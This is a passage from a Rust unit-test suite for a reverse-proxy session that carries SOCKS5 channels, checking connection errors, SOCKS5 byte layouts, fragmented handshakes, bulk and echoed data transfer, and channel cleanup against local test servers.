        let session = ReverseProxySession::new(1, false);
        let req = ConnectRequest {
            channel_id: next_channel_id(),
            target_host: "localhost".into(),
            target_port: 80,
        };
        let result = session.connect(&req);
        assert!(!result.success);
        let err = result.error.unwrap_or_default();
        assert!(err.contains("DNS"), "expected DNS error, got: {}", err);
    }

    /// Connection refused increments failed_connections stat.
    #[test]
    fn test_connect_refused_increments_failed_stat() {
        // Bind a listener and immediately drop it to free the port
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let refused_addr = listener.local_addr().unwrap();
        drop(listener);

        let session = ReverseProxySession::new(2, true);
        let cid = next_channel_id();
        let result = session.connect(&connect_req(cid, refused_addr));

        assert!(!result.success);
        let (_, _, _, _, failed) = session.get_stats();
        assert_eq!(failed, 1, "failed_connections should be 1");
    }

    /// Connection timeout — use a non-routable IP to force timeout.
    #[test]
    fn test_connect_timeout_handling() {
        // 192.0.2.0/24 is TEST-NET-1 (RFC 5737) — packets are dropped, not refused.
        // Use a 1-second timeout so the test is fast.
        let session = ReverseProxySession::new(1, true);
        let cid = next_channel_id();
        let req = ConnectRequest {
            channel_id: cid,
            target_host: "192.0.2.1".into(),
            target_port: 9,
        };
        let result = session.connect(&req);
        assert!(!result.success, "non-routable address should fail");
        let err = result.error.unwrap_or_default();
        // Should be a connect failure, not a DNS error
        assert!(
            err.contains("connect failed") || err.contains("timed out") || err.contains("Connection"),
            "unexpected error: {}", err
        );
    }

    /// SOCKS5 CONNECT request byte layout for IPv4 (ATYP=0x01).
    #[test]
    fn test_socks5_connect_request_ipv4_bytes() {
        // VER CMD RSV ATYP DST.ADDR DST.PORT
        let dst_ip: [u8; 4] = [93, 184, 216, 34]; // example.com
        let dst_port: u16 = 80;
        let mut req_bytes = vec![
            SOCKS5_VERSION,
            SOCKS5_CMD_CONNECT,
            0x00, // RSV
            SOCKS5_ATYP_IPV4,
        ];
        req_bytes.extend_from_slice(&dst_ip);
        req_bytes.extend_from_slice(&dst_port.to_be_bytes());

        assert_eq!(req_bytes.len(), 10);
        assert_eq!(req_bytes[3], SOCKS5_ATYP_IPV4);
        assert_eq!(&req_bytes[4..8], &dst_ip);
        assert_eq!(u16::from_be_bytes([req_bytes[8], req_bytes[9]]), 80);
    }

    /// SOCKS5 CONNECT request byte layout for domain name (ATYP=0x03).
    #[test]
    fn test_socks5_connect_request_domain_bytes() {
        let domain = b"example.com";
        let port: u16 = 443;
        let mut req_bytes = vec![
            SOCKS5_VERSION,
            SOCKS5_CMD_CONNECT,
            0x00,
            SOCKS5_ATYP_DOMAIN,
            domain.len() as u8,
        ];
        req_bytes.extend_from_slice(domain);
        req_bytes.extend_from_slice(&port.to_be_bytes());

        assert_eq!(req_bytes[3], SOCKS5_ATYP_DOMAIN);
        assert_eq!(req_bytes[4] as usize, domain.len());
        // Domain bytes start at index 5
        assert_eq!(&req_bytes[5..5 + domain.len()], domain.as_ref());
    }

    /// SOCKS5 CONNECT request byte layout for IPv6 (ATYP=0x04).
    #[test]
    fn test_socks5_connect_request_ipv6_bytes() {
        let dst_ip: [u8; 16] = [0x20, 0x01, 0x0d, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1];
        let port: u16 = 8080;
        let mut req_bytes = vec![
            SOCKS5_VERSION,
            SOCKS5_CMD_CONNECT,
            0x00,
            SOCKS5_ATYP_IPV6,
        ];
        req_bytes.extend_from_slice(&dst_ip);
        req_bytes.extend_from_slice(&port.to_be_bytes());

        assert_eq!(req_bytes.len(), 22);
        assert_eq!(req_bytes[3], SOCKS5_ATYP_IPV6);
        assert_eq!(&req_bytes[4..20], &dst_ip);
    }

    // ---------------------------------------------------------------------------
    // 3. Protocol edge cases
    // ---------------------------------------------------------------------------

    /// Fragmented handshake — send SOCKS5 greeting in two partial writes.
    #[test]
    fn test_fragmented_handshake_partial_reads() {
        let received = Arc::new(Mutex::new(Vec::<u8>::new()));
        let received_clone = Arc::clone(&received);

        let server_addr = spawn_one_shot_server(move |mut conn| {
            let mut total = Vec::new();
            let mut buf = [0u8; 64];
            // Read until we have all 4 bytes or connection closes
            loop {
                match conn.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => {
                        total.extend_from_slice(&buf[..n]);
                        if total.len() >= 4 {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
            *received_clone.lock().unwrap() = total;
        });

        let session = ReverseProxySession::new(5, true);
        let cid = next_channel_id();
        assert!(session.connect(&connect_req(cid, server_addr)).success);

        // Send first fragment: VER + NMETHODS
        session.send_data(&ChannelData {
            channel_id: cid,
            data: vec![SOCKS5_VERSION, 0x02],
            eof: false,
        }).unwrap();

        thread::sleep(Duration::from_millis(20));

        // Send second fragment: the two method bytes
        session.send_data(&ChannelData {
            channel_id: cid,
            data: vec![SOCKS5_NO_AUTH, SOCKS5_AUTH_USERPASS],
            eof: false,
        }).unwrap();

        thread::sleep(Duration::from_millis(100));

        let got = received.lock().unwrap().clone();
        assert_eq!(got, vec![SOCKS5_VERSION, 0x02, SOCKS5_NO_AUTH, SOCKS5_AUTH_USERPASS]);
    }

    /// Invalid version byte (not 0x05) — byte is still forwarded; consumer detects error.
    #[test]
    fn test_invalid_version_byte_forwarded() {
        let received = Arc::new(Mutex::new(Vec::<u8>::new()));
        let received_clone = Arc::clone(&received);

        let server_addr = spawn_one_shot_server(move |mut conn| {
            let mut buf = [0u8; 4];
            if let Ok(n) = conn.read(&mut buf) {
                received_clone.lock().unwrap().extend_from_slice(&buf[..n]);
            }
        });

        let session = ReverseProxySession::new(5, true);
        let cid = next_channel_id();
        assert!(session.connect(&connect_req(cid, server_addr)).success);

        // Send version 4 instead of 5 — invalid for SOCKS5
        let bad_greeting = vec![0x04u8, 1, SOCKS5_NO_AUTH];
        session.send_data(&ChannelData {
            channel_id: cid,
            data: bad_greeting.clone(),
            eof: false,
        }).unwrap();

        thread::sleep(Duration::from_millis(100));
        let got = received.lock().unwrap().clone();
        assert_eq!(got, bad_greeting, "raw bytes forwarded regardless of SOCKS version");
        // Consumer must check got[0] != 0x05 and reject
        assert_ne!(got[0], SOCKS5_VERSION);
    }

    /// Unsupported command byte (BIND, UDP ASSOCIATE) detection.
    #[test]
    fn test_unsupported_command_bytes() {
        // BIND command
        let bind_req = vec![SOCKS5_VERSION, SOCKS5_CMD_BIND, 0x00, SOCKS5_ATYP_IPV4,
                            0, 0, 0, 0, 0x00, 0x50];
        assert_eq!(bind_req[1], SOCKS5_CMD_BIND);
        assert_ne!(bind_req[1], SOCKS5_CMD_CONNECT);

        // UDP ASSOCIATE command
        let udp_req = vec![SOCKS5_VERSION, SOCKS5_CMD_UDP_ASSOC, 0x00, SOCKS5_ATYP_IPV4,
                           0, 0, 0, 0, 0x00, 0x50];
        assert_eq!(udp_req[1], SOCKS5_CMD_UDP_ASSOC);
        assert_ne!(udp_req[1], SOCKS5_CMD_CONNECT);

        // REP_CMD_NOT_SUPPORTED reply
        let reply = vec![SOCKS5_VERSION, REP_CMD_NOT_SUPPORTED, 0x00, SOCKS5_ATYP_IPV4,
                         0, 0, 0, 0, 0, 0];
        assert_eq!(reply[1], REP_CMD_NOT_SUPPORTED);
    }

    /// Address type validation — all three ATYP values are distinct and correct.
    #[test]
    fn test_address_type_validation() {
        assert_eq!(SOCKS5_ATYP_IPV4, 0x01);
        assert_eq!(SOCKS5_ATYP_DOMAIN, 0x03);
        assert_eq!(SOCKS5_ATYP_IPV6, 0x04);

        // Parse a raw reply and check ATYP field (index 3)
        let reply_ipv4 = vec![SOCKS5_VERSION, REP_SUCCESS, 0x00, SOCKS5_ATYP_IPV4,
                              127, 0, 0, 1, 0x1F, 0x90]; // BND.ADDR=127.0.0.1 BND.PORT=8080
        assert_eq!(reply_ipv4[3], SOCKS5_ATYP_IPV4);

        let reply_ipv6 = vec![SOCKS5_VERSION, REP_SUCCESS, 0x00, SOCKS5_ATYP_IPV6];
        assert_eq!(reply_ipv6[3], SOCKS5_ATYP_IPV6);

        // REP_ADDR_TYPE_NOT_SUPPORTED for unknown ATYP
        let unknown_atyp = 0x05u8;
        let error_reply = vec![SOCKS5_VERSION, REP_ADDR_TYPE_NOT_SUPPORTED, 0x00, unknown_atyp];
        assert_eq!(error_reply[1], REP_ADDR_TYPE_NOT_SUPPORTED);
    }

    /// Reply code validation — all 8 SOCKS5 reply codes.
    #[test]
    fn test_reply_code_all_eight_values() {
        let reply_codes = [
            (REP_SUCCESS,              "success"),
            (REP_GENERAL_FAILURE,      "general failure"),
            (REP_CONN_NOT_ALLOWED,     "connection not allowed"),
            (REP_NET_UNREACHABLE,      "network unreachable"),
            (REP_HOST_UNREACHABLE,     "host unreachable"),
            (REP_CONN_REFUSED,         "connection refused"),
            (REP_TTL_EXPIRED,          "TTL expired"),
            (REP_CMD_NOT_SUPPORTED,    "command not supported"),
        ];
        assert_eq!(reply_codes.len(), 8, "SOCKS5 defines exactly 8 reply codes");
        assert_eq!(reply_codes[0].0, 0x00);
        assert_eq!(reply_codes[7].0, 0x07);
        // Every code must be unique
        let codes: Vec<u8> = reply_codes.iter().map(|(c, _)| *c).collect();
        let unique: std::collections::HashSet<u8> = codes.iter().copied().collect();
        assert_eq!(codes.len(), unique.len(), "reply codes must be unique");

        // REP_ADDR_TYPE_NOT_SUPPORTED is the 9th defined code (not in the main 8)
        assert_eq!(REP_ADDR_TYPE_NOT_SUPPORTED, 0x08);
    }

    // ---------------------------------------------------------------------------
    // 4. Data transfer tests
    // ---------------------------------------------------------------------------

    /// Large data transfer — 1 MB+ through a tunnel channel.
    #[test]
    fn test_large_data_transfer_1mb() {
        let mb = 1024 * 1024usize;
        let payload: Vec<u8> = (0..mb).map(|i| (i % 251) as u8).collect(); // 1 MB
        let payload_clone = payload.clone();
        let received = Arc::new(Mutex::new(Vec::<u8>::new()));
        let received_clone = Arc::clone(&received);

        let server_addr = spawn_one_shot_server(move |mut conn| {
            let mut buf = vec![0u8; 4096];
            let mut total = Vec::new();
            loop {
                match conn.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => total.extend_from_slice(&buf[..n]),
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => break,
                    Err(_) => break,
                }
            }
            *received_clone.lock().unwrap() = total;
        });

        let session = ReverseProxySession::new(10, true);
        let cid = next_channel_id();
        assert!(session.connect(&connect_req(cid, server_addr)).success);

        // Send in 64 KB chunks to exercise multiple writes
        let chunk_size = 65536;
        for chunk in payload_clone.chunks(chunk_size) {
            session.send_data(&ChannelData {
                channel_id: cid,
                data: chunk.to_vec(),
                eof: false,
            }).unwrap();
        }

        // Signal EOF so server finishes reading
        session.send_data(&ChannelData {
            channel_id: cid,
            data: vec![],
            eof: true,
        }).unwrap();

        thread::sleep(Duration::from_millis(300));

        let got = received.lock().unwrap().clone();
        assert_eq!(got.len(), payload.len(), "all {} bytes must arrive", mb);
        assert_eq!(got, payload, "data integrity check");

        let (_, bytes_out, _, total_conns, _) = session.get_stats();
        assert_eq!(bytes_out, mb as u64, "stats must reflect full transfer");
        assert_eq!(total_conns, 1);
    }

    /// Bidirectional data flow — send data to target, receive echoed data back.
    #[test]
    fn test_bidirectional_data_flow() {
        // Echo server: reads all data, writes it back
        let server_addr = spawn_one_shot_server(|mut conn| {
            let mut buf = vec![0u8; 4096];
            loop {
                match conn.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => {
                        if conn.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        let session = ReverseProxySession::new(5, true);
        let cid = next_channel_id();
        assert!(session.connect(&connect_req(cid, server_addr)).success);

        let test_messages: &[&[u8]] = &[
            b"first message",
            b"second message payload here",
            b"final chunk of bidirectional test",
        ];

        for msg in test_messages {
            session.send_data(&ChannelData {
                channel_id: cid,
                data: msg.to_vec(),
                eof: false,
            }).unwrap();

            thread::sleep(Duration::from_millis(50));

            let mut recv_buf = vec![0u8; 256];
            let n = session.recv_data(cid, &mut recv_buf).unwrap();
            assert_eq!(&recv_buf[..n], *msg, "echoed data must match sent data");
        }

        let (bytes_in, bytes_out, _, _, _) = session.get_stats();
        let total: u64 = test_messages.iter().map(|m| m.len() as u64).sum();
        assert_eq!(bytes_out, total);
        assert_eq!(bytes_in, total);
    }

    /// Connection close handling — EOF on send closes the channel.
    #[test]
    fn test_connection_close_via_eof_flag() {
        let server_addr = spawn_one_shot_server(|mut conn| {
            let mut buf = [0u8; 64];
            let _ = conn.read(&mut buf);
        });

        let session = ReverseProxySession::new(5, true);
        let cid = next_channel_id();
        let result = session.connect(&connect_req(cid, server_addr));
        assert!(result.success);

        let (_, _, active_before, _, _) = session.get_stats();
        assert_eq!(active_before, 1);

        // Send EOF — this should close the channel
        session.send_data(&ChannelData {
            channel_id: cid,
            data: vec![],
            eof: true,
        }).unwrap();

        let (_, _, active_after, _, _) = session.get_stats();
        assert_eq!(active_after, 0, "channel must be closed after EOF");

        // Subsequent send to closed channel must fail
        let err = session.send_data(&ChannelData {
            channel_id: cid,
            data: b"should fail".to_vec(),
            eof: false,
        });
        assert!(err.is_err(), "send to closed channel must return error");
    }

    /// Remote close — server closes connection, recv_data returns 0 and closes channel.
    #[test]
    fn test_connection_close_by_remote() {
        // Server immediately closes connection after accept
        let server_addr = spawn_one_shot_server(|conn| {
            drop(conn);
        });

        let session = ReverseProxySession::new(5, true);
        let cid = next_channel_id();
        assert!(session.connect(&connect_req(cid, server_addr)).success);

        thread::sleep(Duration::from_millis(100));

        let mut buf = [0u8; 64];
        // recv_data should return Ok(0) on EOF and close the channel
        let n = session.recv_data(cid, &mut buf).unwrap_or(0);
        assert_eq!(n, 0, "closed connection should yield 0 bytes");

        // Channel should be removed now
        assert!(
            session.active_channels().is_empty(),
            "channel must be cleaned up after remote close"
        );
    }

    // ---------------------------------------------------------------------------
    // 5. Additional edge-case and robustness tests
    // ---------------------------------------------------------------------------

    /// Sending data to a non-existent channel returns an error.
    #[test]
    fn test_send_to_nonexistent_channel() {
        let session = ReverseProxySession::new(5, true);
        let err = session.send_data(&ChannelData {
            channel_id: 99999,
            data: b"data".to_vec(),
            eof: false,
        });
        assert!(err.is_err());
        let msg = format!("{:?}", err.unwrap_err());
        assert!(msg.contains("channel not found") || msg.contains("Module"));
    }

    /// Receiving from a non-existent channel returns an error.
    #[test]
    fn test_recv_from_nonexistent_channel() {
        let session = ReverseProxySession::new(5, true);
        let mut buf = [0u8; 64];
        let err = session.recv_data(99999, &mut buf);
        assert!(err.is_err());
    }

    /// Inactive session rejects new connections.
    #[test]
    fn test_connect_on_inactive_session() {
        let server_addr = spawn_one_shot_server(|_| {});
        let session = ReverseProxySession::new(5, true);
        session.stop();

        let result = session.connect(&connect_req(next_channel_id(), server_addr));
        assert!(!result.success);
        assert!(result.error.as_ref().unwrap().contains("not active"));
    }

    /// Multiple concurrent channels on the same session are tracked independently.
    #[test]
    fn test_multiple_channels_independent_tracking() {
        let server_addr1 = spawn_server(|mut c| { let mut b = [0u8; 8]; let _ = c.read(&mut b); });
        let server_addr2 = spawn_server(|mut c| { let mut b = [0u8; 8]; let _ = c.read(&mut b); });

        let session = ReverseProxySession::new(5, true);
        let cid1 = next_channel_id();
        let cid2 = next_channel_id();

        assert!(session.connect(&connect_req(cid1, server_addr1)).success);
        assert!(session.connect(&connect_req(cid2, server_addr2)).success);

        let active = session.active_channels();
        assert_eq!(active.len(), 2);
        assert!(active.contains(&cid1));
        assert!(active.contains(&cid2));

        let (_, _, active_count, total, _) = session.get_stats();
        assert_eq!(active_count, 2);
        assert_eq!(total, 2);

        session.close_channel(cid1);
        assert_eq!(session.active_channels().len(), 1);
        assert!(session.active_channels().contains(&cid2));

        session.close_channel(cid2);
        assert!(session.active_channels().is_empty());
    }

    /// Stop session closes all channels atomically.
    #[test]
    fn test_stop_session_closes_all_channels() {
        let addrs: Vec<_> = (0..3)
            .map(|_| spawn_server(|mut c| { let mut b = [0u8; 8]; let _ = c.read(&mut b); }))
            .collect();

        let session = ReverseProxySession::new(5, true);
        for &addr in &addrs {
            let cid = next_channel_id();
            assert!(session.connect(&connect_req(cid, addr)).success);
        }

        assert_eq!(session.active_channels().len(), 3);
        session.stop();

        assert!(!session.active.load(Ordering::SeqCst));
        assert!(session.active_channels().is_empty(), "all channels must be cleared on stop");
    }

    /// global handle_connect returns failure when session doesn't exist.
    #[test]
    fn test_handle_connect_missing_session() {
        let req = ConnectRequest {
            channel_id: next_channel_id(),
            target_host: "127.0.0.1".into(),
            target_port: 80,
        };
        let result = handle_connect(u32::MAX, &req);
        assert!(!result.success);
        assert!(result.error.as_ref().unwrap().contains("session not found"));
    }

    /// global stop_session returns false for unknown session ID.
    #[test]
    fn test_stop_nonexistent_session() {
        assert!(!stop_session(u32::MAX - 1));
    }

    /// global send_channel_data returns error for unknown session.
    #[test]
    fn test_send_channel_data_missing_session() {
        let err = send_channel_data(u32::MAX, &ChannelData {
            channel_id: 1,
            data: b"x".to_vec(),
            eof: false,
        });
        assert!(err.is_err());
    }

    /// global recv_channel_data returns error for unknown session.
    #[test]
    fn test_recv_channel_data_missing_session() {
        let mut buf = [0u8; 64];
        let err = recv_channel_data(u32::MAX, 1, &mut buf);
        assert!(err.is_err());
    }

    /// Close channel via global helper is a no-op for unknown session (does not panic).
    #[test]
    fn test_close_channel_missing_session_no_panic() {
        close_channel(u32::MAX, 1); // must not panic
    }

    /// is_ip_address handles edge cases: empty string, port-embedded strings.
    #[test]
    fn test_is_ip_address_edge_cases() {
        assert!(!is_ip_address(""));
        assert!(!is_ip_address("127.0.0.1:80")); // port suffix → not a bare IP
        assert!(!is_ip_address("300.0.0.1"));    // out of range octet
        assert!(!is_ip_address("[::1]"));         // bracket notation not an IpAddr
        assert!(is_ip_address("0.0.0.0"));
        assert!(is_ip_address("255.255.255.255"));
        assert!(is_ip_address("fe80::1"));
    }

    /// SOCKS5 reply byte layout — success reply for IPv4 bound address.
    #[test]
    fn test_socks5_success_reply_ipv4_layout() {
        // VER REP RSV ATYP BND.ADDR(4) BND.PORT(2)
        let bnd_ip: [u8; 4] = [127, 0, 0, 1];
        let bnd_port: u16 = 1080;
        let mut reply = vec![SOCKS5_VERSION, REP_SUCCESS, 0x00, SOCKS5_ATYP_IPV4];
        reply.extend_from_slice(&bnd_ip);
        reply.extend_from_slice(&bnd_port.to_be_bytes());

        assert_eq!(reply.len(), 10, "IPv4 reply must be 10 bytes");
        assert_eq!(reply[0], SOCKS5_VERSION);
        assert_eq!(reply[1], REP_SUCCESS);
        assert_eq!(reply[2], 0x00, "RSV must be zero");
        assert_eq!(reply[3], SOCKS5_ATYP_IPV4);
        assert_eq!(&reply[4..8], &bnd_ip);
        assert_eq!(u16::from_be_bytes([reply[8], reply[9]]), bnd_port);
    }

    /// Channel data EOF flag short-circuits the write path.
    #[test]
    fn test_channel_data_eof_skips_write() {
        let received = Arc::new(Mutex::new(Vec::<u8>::new()));
        let received_clone = Arc::clone(&received);

        let server_addr = spawn_one_shot_server(move |mut conn| {
            let mut buf = [0u8; 64];
            if let Ok(n) = conn.read(&mut buf) {
                received_clone.lock().unwrap().extend_from_slice(&buf[..n]);
            }
        });

        let session = ReverseProxySession::new(5, true);
        let cid = next_channel_id();
        assert!(session.connect(&connect_req(cid, server_addr)).success);

        // Send EOF with non-empty data — implementation closes channel, data not written
        let result = session.send_data(&ChannelData {
            channel_id: cid,
            data: b"should not arrive".to_vec(),
            eof: true,
        });
        assert!(result.is_ok());

        thread::sleep(Duration::from_millis(100));

        // Server may or may not receive data depending on timing;
        // the key assertion is the channel is now closed
        let (_, _, active, _, _) = session.get_stats();
        assert_eq!(active, 0, "EOF must close the channel");
    }
}
